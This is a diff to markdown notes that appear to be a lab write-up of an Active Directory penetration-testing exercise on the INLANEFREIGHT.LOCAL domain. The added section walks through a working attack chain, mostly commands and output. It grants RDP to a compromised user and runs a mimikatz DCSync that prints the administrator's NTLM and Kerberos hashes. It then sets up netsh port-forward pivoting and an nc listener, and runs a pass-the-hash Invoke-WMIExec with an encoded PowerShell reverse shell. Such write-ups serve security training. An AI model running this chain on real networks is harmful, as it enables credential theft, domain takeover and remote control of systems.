@@ -1,7 +1,5 @@
 # AD
 
-## Tools&#x20;
-
 
 
 ## Nmap
@@ -172,6 +170,8 @@ And the password for the user tpetty is Sup3rS3cur3D0m@inU2eR
 
 ### DCSync attack
 
+#### in the second machine using the user with admin rights svc\_sql
+
 Using the information provided in the **ACL Enumeration** module, we can determine that the `tpetty`username.
 
 ```
@@ -182,4 +182,136 @@ Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $tp
 ```
 
 And we detect that the **ObjectAce** Type are: **DS-Replication-Get-Changes-In-Filtered-Set** and **DS-Replication-Get-Changes**&#x20;
+
+And now, in order to perform the attack with the user tpetty, we need to enable RDP to that user.
+
+```
+Add-LocalGroupMember -Group "Remote Desktop Users" -Member tpetty
+```
+
+And now, we replicate the netsh in the second machine also to allow download files from the third machine.
+
+#### In the second machine, using the user tpetty&#x20;
+
+We download mimikatz and execute:
+
+```
+lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+```
+
+```
+mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+[DC] 'INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
+[DC] 'INLANEFREIGHT\administrator' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000200 ( NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 4/11/2022 9:24:49 PM
+Object Security ID   : S-1-5-21-2270287766-1317258649-2146029398-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: 27dedb1dab4d8545c6e1c66fba077da0
+    ntlm- 0: 27dedb1dab4d8545c6e1c66fba077da0
+    ntlm- 1: bdaffbfe64f1fc646a3353be1c2c3c99
+    lm  - 0: 757743529af55e110994f3c7e3710fc9
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : b8bcb44123b3cc3bff20c663f1e0b94d
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : INLANEFREIGHT.LOCALAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : a76102a5617bffb1ea84ba0052767992823fd414697e81151f7de21bb41b1857
+      aes128_hmac       (4096) : 69e27df2550c5c270eca1d8ce5c46230
+      des_cbc_md5       (4096) : c2d9c892f2e6f2dc
+    OldCredentials
+      aes256_hmac       (4096) : 51d2b5ce03d6ea2e75e69050f32b927d0e602c2806dcb0d1dd0aacdda619a510
+      aes128_hmac       (4096) : b93da9262f5ce0ed724ce0177366bc8a
+      des_cbc_md5       (4096) : 0876d604a7087cf7
+    OlderCredentials
+      aes256_hmac       (4096) : 23cbc0dad348bebcbdbb4c82e9b23af299e8b56de358bafe24f2235f34497e4a
+      aes128_hmac       (4096) : e35eb565af30c8ed79df5d8875508df6
+      des_cbc_md5       (4096) : 4904021983252cd5
+
+* Primary:Kerberos *
+    Default Salt : INLANEFREIGHT.LOCALAdministrator
+    Credentials
+      des_cbc_md5       : c2d9c892f2e6f2dc
+    OldCredentials
+      des_cbc_md5       : 0876d604a7087cf7
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  c05d2bd2d448c260d63c391862358e9a
+    02  2ba60ae4300b00bd1a20b601f24e386a
+    03  cd2b7cce6ac8a39ac0a5a048feaa059a
+    04  c05d2bd2d448c260d63c391862358e9a
+    05  1084cdc6cf3b03a0425a0b4b6f8df2ab
+    06  4cbd7e1c07a9cd8f5d74821b8f7d73b5
+    07  a60dd8c295cfea5356e2e071336e4b73
+    08  9549ac69526305a3b52fc7eb81c36d5b
+    09  41883c94f1394d3f6420113ee9bde48b
+    10  cf77d4474145a014474eac18cb559026
+    11  9549ac69526305a3b52fc7eb81c36d5b
+    12  81319b4284c63dd5ecab7c53c41f2f4b
+    13  f586b7f78f320c2b7f7153e3adfa3d60
+    14  7ddf4411eb64636a952e01a3a6065213
+    15  581bab6ff054b23e65f14adc15126f9e
+    16  8638e61dd907d6ca411e1be885cf6ae2
+    17  fec8a8deb4f9320986e0deaae31c7974
+    18  f7dc49e2e0539d0e221b46139677c903
+    19  f405be39c0733cb794a2aca4b072f2a7
+    20  cf83e03b8abad7ae24a3b010cf3c7577
+    21  982dab323d8efa80ad1550985eb49e71
+    22  731741e7f2f621aaa2f446eb77997beb
+    23  b5928a821c656d267659d5eb5e4ab02d
+    24  020ab18e15e8a5fbd66748455afae6e5
+    25  4ac30d853103b2f8362243b72955d89f
+    26  9a0a62820b990a595affa9ac2119f299
+    27  5fda8e968eabd2561522cb2c2a918f56
+    28  224906fbb8c4570c87416aaee7b6419c
+    29  5632d3eb6e5fc24a09f67092988a92ef
+```
+
+#### And finally, in the second machine using the user svc\_sql
+
+first we need to configure the environment for the pivoting
+
+```
+netsh.exe interface portproxy add v4tov4 listenport=9999 listenaddress=172.16.6.50 connectport=9999 connectaddress=172.16.6.100
+netsh.exe interface portproxy add v4tov4 listenport=9999 listenaddress=172.16.6.100 connectport=9999 connectaddress=10.10.15.66
+```
+
+Now we download in the second machine MS01 the `Invoke-WMIExec.ps1` in order to execute a remote command.
+
+This was taught on the **Pass the hash (PtH)** section in the **PASSWORD ATTACKS** module.
+
+On our attacker machine:
+
+```
+nc -lnvp 9999
+```
+
+```
+Import-Module .\Invoke-WMIExec.ps1
+Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username administrator -Hash 27dedb1dab4d8545c6e1c66fba077da0 -Command "powershell -e JABjAGwAaQ...
+```
+
+And we execute the above on the MS01 machine to obtain a revershe shell.
+
+The reverse shell code for powershell can be created on [https://www.revshells.com/](https://www.revshells.com/) using the Powershell#3 (base64)
 
